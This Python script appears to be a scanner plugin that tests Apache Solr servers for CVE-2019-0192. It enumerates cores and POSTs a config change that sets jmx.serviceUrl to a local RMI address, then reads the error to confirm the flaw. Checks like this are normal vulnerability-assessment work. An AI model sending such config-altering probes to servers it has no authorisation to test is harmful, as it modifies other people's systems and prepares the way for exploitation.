# -*- coding:utf-8 -*-

import requests
import json
import base64
import warnings

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    print('testing if solr deserialization of untrusted data via jmx.serviceUrl(CVE-2019-0192) vul')
    warnings.filterwarnings("ignore")
    testurl = url + '/solr/admin/cores?wt=json'
    try:
        r = requests.get(testurl, verify=False, allow_redirects=False)
        if r.status_code == 200:
            if r.json()['status'] == "":
                msg = 'There is no solr deserialization of untrusted data via jmx.serviceUrl(CVE-2019-0192) vul'
                number = 'v0'
                return False, url, number, msg
            else:
                a = list(r.json()['status'].keys())
                ressource = "/solr/" + a[0] + "/config"
        else:
            msg = 'There is no solr deserialization of untrusted data via jmx.serviceUrl(CVE-2019-0192) vul'
            number = 'v0'
            return False, url, number, msg
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False, url, number, msg
    vulurl = url + ressource
    vul_headers = {"Content-Type": "application/json"}
    vul_json = {
        "set-property": {"jmx.serviceUrl": "service:jmx:rmi:///jndi/rmi://127.0.0.1:56411/vultest"}}
    try:
        r = requests.post(vulurl, headers=vul_headers, json=vul_json)
        if "[rmi://127.0.0.1:56411/vultest]" in r.text and r.status_code == 500:
            msg = 'There is a solr deserialization of untrusted data via jmx.serviceUrl(CVE-2019-0192) vul on %s' % vulurl
            print(msg)
            number = 'v113'
            return True, url, number, msg
        else:
            pass
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False, url, number, msg
    msg = 'There is no solr deserialization of untrusted data via jmx.serviceUrl(CVE-2019-0192) vul'
    number = 'v0'
    return False, url, number, msg